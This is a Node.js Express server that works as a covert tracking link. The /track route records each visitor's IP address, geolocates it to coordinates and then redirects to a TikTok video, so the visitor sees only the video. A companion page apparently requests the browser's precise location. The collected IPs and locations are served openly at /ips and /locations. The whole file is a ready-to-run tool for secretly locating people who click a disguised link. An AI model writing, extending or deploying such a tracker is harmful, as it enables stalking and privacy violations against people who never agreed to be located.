'use strict';

const express = require('express');
const path = require('path');
const geolocation = require('geolocation');

const app = express();
const PORT = 8000;

const TRACK_URL = 'https://vt.tiktok.com/ZSrpRCWCR/';

// Store visitor IPs in memory
const visitorIPs = [];
// Store visitor locations in memory
const visitorLocations = [];

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// New route to serve the tracking page that requests geolocation
app.get('/trackpage', (req, res) => {
  res.sendFile('trackpage.html', { root: path.join(__dirname, 'public') });
});

// Tracking route
app.get('/track', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  console.log(`Tracking link accessed from IP: ${ip}`);
  if (!visitorIPs.includes(ip)) {
    visitorIPs.push(ip);
    // Use geolocation package to get location from IP
    geolocation.lookup(ip, (err, location) => {
      if (!err && location) {
        const { ll } = location; // ll is [latitude, longitude]
        visitorLocations.push({ latitude: ll[0], longitude: ll[1] });
        console.log(`IP-based location: Latitude ${ll[0]}, Longitude ${ll[1]}`);
      }
    });
  }
  res.redirect(TRACK_URL);
});

// Route to get visitor IPs
app.get('/ips', (req, res) => {
  res.json(visitorIPs);
});

// Route to receive visitor location data
app.post('/location', (req, res) => {
  const { latitude, longitude } = req.body;
  if (typeof latitude === 'number' && typeof longitude === 'number') {
    visitorLocations.push({ latitude, longitude });
    console.log(`Received location: Latitude ${latitude}, Longitude ${longitude}`);
    res.status(200).json({ message: 'Location received' });
  } else {
    res.status(400).json({ message: 'Invalid location data' });
  }
});

// Route to get visitor locations
app.get('/locations', (req, res) => {
  res.json(visitorLocations);
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
